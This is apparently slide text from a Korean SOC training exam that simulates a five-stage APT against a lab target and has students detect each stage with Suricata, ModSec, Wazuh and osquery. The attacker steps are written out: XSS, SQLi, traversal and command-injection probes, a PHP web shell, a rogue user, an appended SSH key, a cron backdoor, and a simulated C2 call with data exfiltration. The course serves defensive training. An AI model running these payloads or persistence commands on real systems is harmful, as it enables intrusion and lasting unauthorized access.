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107"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Module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기말 — APT 5 단계 종합 대응 + 보고서 (180분)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FD8DC"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>기말 — APT 5 단계 통합 시험 (180분, 100점)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A4AE"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>보안솔루션운영 (secops) · 6v6 학습 환경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Module 15 — 이론 +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기말 — APT 5 단계 종합 대응 + 보고서 (180분)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1. 시험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1.1 형식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1.2 시험 환경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3. 5 단계 시나리오 상세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3.1 단계 1 (20점) — Reconnaissance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Red 행위 (시뮬)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Blue 측 평가 항목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검증 명령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3.2 단계 2 (20점) — Initial Access (SQLi 시도)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Red 행위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Blue 측 평가 항목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검증 명령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3.3 단계 3 (20점) — Lateral Movement (nmap scan)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Red 행위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2. Engagement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시작: 2026-MM-DD HH:MM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종료: 같은 날 + 30 분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Adversary: K-APT (가상)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Target: mediforum.6v6.lab (의료 데이터 모사)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Operator: 본인 (SOC 분석가)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4. MITRE ATT&amp;CK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T1595 Active Scanning (404 recon)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T1190 Exploit Public-Facing (SQLi)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T1046 Network Service Scanning (nmap)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T1041 Exfiltration over C2 (outbound)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5. ISMS-P 2.12 만족도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2.12.1 사고 인지 — 5 단계 모두 alert 발생 (성공)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2.12.2 대응 체계 — 자동 차단 (ModSec) + 분석 (SOC 분석가)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2.12.3 사고 분석 — timeline 통합 (Wazuh + Suricata + ModSec)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2.12.4 사후 관리 — AAR 작성 + IOC 갱신 + Coverage Matrix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7. 영향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침해 0건 (모든 시도 차단)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alert fatigue 5건 (분석가 부담 — acceptable)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false-positive 0 (정확한 룰)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데이터 유출 0 byte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9. Lessons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잘 된 점: 5 단계 모두 detect + 4 단계 자동 차단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개선: alert burst 시 SOC 분석가 burnout 의 risk → 자동화 강화 필요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다음 사이클: 분기 review 후 룰 강화 + 재 시뮬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평가 항목 (단계 5 의 20점)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5. 시험 진행 순서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5.1 시작 전 (5분)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5.2 실기 (120분)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5.3 보고서 (60분)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5.4 시험 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5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실습 (Hands-on Lab)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단계 1 (20점) — Reconnaissance (정찰)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Red — nmap + HTTP fuzzing + URL brute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'sudo nmap -sT -p 22,80,443,2204,9100 10.20.30.1 2&gt;&amp;1 | tail -10'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vh in juice dvwa siem portal bastion; do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ssh 6v6-attacker "curl -s -o /dev/null -w '$vh: %{http_code}\\n' -H 'Host: $vh.6v6.lab' http://10.20.30.1/"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done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path in admin api .env .git phpmyadmin; do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ssh 6v6-attacker "curl -s -o /dev/null -w 'path /$path: %{http_code}\\n' -H 'Host: juice.6v6.lab' http://10.20.30.1/$path"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done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5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Blue — fw / ips / ModSec 매치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fw dmesg drop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dmesg | grep -i DROP | tail -5'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ips ET SCAN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grep "ET SCAN" /var/log/suricata/eve.json 2&gt;/dev/null | tail -3 | jq -c "{sig:.alert.signature}"' 2&gt;&amp;1 | head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ModSec 913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-10 /var/log/apache2/modsec_audit.log | jq -r ".audit_data.messages[]" 2&gt;&amp;1 | grep -oE "\[id \"913[0-9]+\"\]" | sort -u'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(verify 절차는 lab YAML 참조)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(학습 의의는 lab YAML 참조)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단계 2 (20점) — Initial Access (최초 침투)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Red — 4 vector burst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payload in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"?q=&lt;script&gt;alert(1)&lt;/script&gt;"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"?q=1'%20OR%20'1'='1"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"?q=../../etc/passwd" \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"?q=;cat%20/etc/passwd"; do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code=$(ssh 6v6-attacker "curl -s -o /dev/null -w '%{http_code}' -H 'Host: juice.6v6.lab' 'http://10.20.30.1/$payload'")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echo "$payload → $code"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done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5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Blue — ModSec 5 카테고리 + Suricata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카테고리 분포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-10 /var/log/apache2/modsec_audit.log | jq -r ".audit_data.messages[]" 2&gt;&amp;1 | grep -oE "\[id \"[0-9]+\"\]" | sort | uniq -c | sort -rn | head'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anomaly score 누적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tail -5 /var/log/apache2/modsec_audit.log | jq -r ".audit_data.messages[]" 2&gt;&amp;1 | grep -oE "Total Score: [0-9]+|SQLI=[0-9]+,XSS=[0-9]+,RFI=[0-9]+,LFI=[0-9]+,RCE=[0-9]+,PHPI=[0-9]+"'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Wazuh alerts.json delta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tail -20 /var/ossec/logs/alerts/alerts.json | jq "select(.agent.name==\"ips\" or .agent.name==\"web\") | {rule_id:.rule.id, level:.rule.level, agent:.agent.name}"' 2&gt;&amp;1 | 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(verify 절차는 lab YAML 참조)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(학습 의의는 lab YAML 참조)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단계 3 (20점) — Execution + Lateral Movement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Red — 4 침해 시뮬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Red — 4 침해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bash -c "echo \"&lt;?php system(\$_GET[c]); ?&gt;\" &gt; /var/www/html/w15_shell.php"' 2&gt;/dev/null || ssh 6v6-web 'sudo touch /tmp/w15_shell.php'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useradd -m -u 1099 fakeintruder 2&gt;/dev/null &amp;&amp; echo "user created"'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bash -c "echo \"ssh-rsa W15FAKEKEY evil@w15\" &gt;&gt; /root/.ssh/authorized_keys"'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bash -c "echo \"* * * * * root /tmp/w15_x.sh\" &gt; /etc/cron.d/w15_backdoor"'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3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Blue — osquery 5 헌팅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Blue — osquery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--json "SELECT username, uid FROM users WHERE uid=1099;"' 2&gt;&amp;1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--json "SELECT key FROM authorized_keys WHERE key LIKE \"%W15FAKEKEY%\";"' 2&gt;&amp;1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--json "SELECT command, path FROM crontab WHERE path LIKE \"%w15_backdoor%\";"' 2&gt;&amp;1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--json "SELECT path, mtime FROM file WHERE path = \"/etc/cron.d/w15_backdoor\";"' 2&gt;&amp;1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--json "SELECT path FROM file WHERE path LIKE \"%w15_shell%\";"' 2&gt;&amp;1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syscheck (있다면)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15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tail -20 /var/ossec/logs/alerts/alerts.json | jq "select(.rule.groups | contains([\"syscheck\"])) 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(verify 절차는 lab YAML 참조)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(학습 의의는 lab YAML 참조)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단계 4 (20점) — C2 + Exfiltration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Red — 시뮬 IOC IP 와 통신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Red — known IOC 통신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'curl -s -o /dev/null --max-time 3 http://192.168.99.99/ 2&gt;&amp;1' || echo "(unreachable but Suricata 가 outbound packet 감지)"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추가 — outbound 443 대량 data 시뮬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6v6-attacker 'dd if=/dev/urandom bs=1M count=2 2&gt;/dev/null | curl -s -o /dev/null -X POST --data-binary @- -H "Host: juice.6v6.lab" http://10.20.30.1/upload 2&gt;&amp;1 | head'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5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Blue — Suricata + Wazuh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Suricata alerts (외부 통신)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6v6-ips 'sudo tail -20 /var/log/suricata/eve.json | jq "select(.event_type==\"alert\" and (.dest_ip == \"192.168.99.99\" or .src_ip == \"10.20.30.202\")) | {sig:.alert.signature}"' 2&gt;&amp;1 | head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Wazuh level 5+ alerts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tail -20 /var/ossec/logs/alerts/alerts.json | jq "select(.rule.level &gt;= 5) | {rule_id:.rule.id, level:.rule.level, desc:.rule.description, agent:.agent.name}"' 2&gt;&amp;1 | head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CDB list 시뮬 (있다면)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cat /var/ossec/etc/lists/known-malicious-ips 2&gt;/dev/null | head'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OpenCTI enrichment 시뮬 (실 OpenCTI 미설치라 데이터만 보여줌)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OpenCTI enrichment (시뮬)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Indicator 192.168.99.99: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- GeoIP: Russia / Moscow / AS12345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- WHOIS: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(verify 절차는 lab YAML 참조)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(학습 의의는 lab YAML 참조)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단계 5 (20점) — Response + Reporting + Cleanup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(verify 절차는 lab YAML 참조)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(학습 의의는 lab YAML 참조)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본 module 종료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C107"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>다음 module → 과정 종료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